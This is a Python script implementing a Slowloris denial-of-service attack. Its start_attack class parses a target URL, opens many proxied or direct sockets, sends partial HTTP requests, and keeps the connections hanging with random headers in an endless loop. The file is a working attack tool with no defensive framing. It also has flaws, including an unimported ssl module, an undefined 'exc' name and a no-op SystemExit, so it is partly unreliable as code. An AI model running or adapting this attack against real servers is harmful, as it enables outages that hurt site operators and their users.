#!/usr/bin/env python3

import time
import random
import socket
import logging
import socks
from store import store_data
from urllib.parse import urlparse


_list_of_sockets = []

class start_attack():

    @classmethod
    def form_url(self, url: str, ssl: bool = False):
        port = None
        try:
            res = urlparse(url)
            port = res.port
        except Exception as ex:
            raise exc.InvalidURIError("Invalid uri string") from ex
        else:
            # scheme will be validated in the constructor
            if res.scheme:
                ssl = res.scheme[-1] == "s"
            if not port:
                port = 443 if ssl else 80

            return store_data(
                scheme=res.scheme or "http",
                host=res.hostname,
                port=port,
                path=res.path or "/",
                ssl=ssl,
            )


    @classmethod
    def initialize_socket(self, m):
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s = socks.socksocket()
        s.settimeout(4)
        if m.p == True:
            try:
                s.set_proxy(socks.HTTP, m.socket_ip, m.socket_port)
            except:
                logging.debug("No proxyport or no proxyhost specified")
                SystemExit
        socket.socket = socks.socksocket
        s.connect((m.host, m.port))
        if m.port == 443:
            s = ssl.wrap_socket(s)
        for line in m.lines:
            s.send(line.encode("utf-8"))

        return s


    @classmethod
    def perform_attack(self, s, socket_count, m):
       while True:
        try:
            for s in list(_list_of_sockets):
                try:
                    x = f"X-a: {random.randint(1, 5000)}"
                    s.send(x.encode("utf-8"))
                except socket.error:
                    _list_of_sockets.remove(s)


            for _ in range(socket_count - len(_list_of_sockets)):
                try:
                    s = self.initialize_socket(m)
                    if s:
                        _list_of_sockets.append(s)
                except socket.error as e:
                    logging.debug(e)
                    break
            time.sleep(4)

        except (KeyboardInterrupt, SystemExit):
            logging.info("slowloris attack has been stopped")
            break

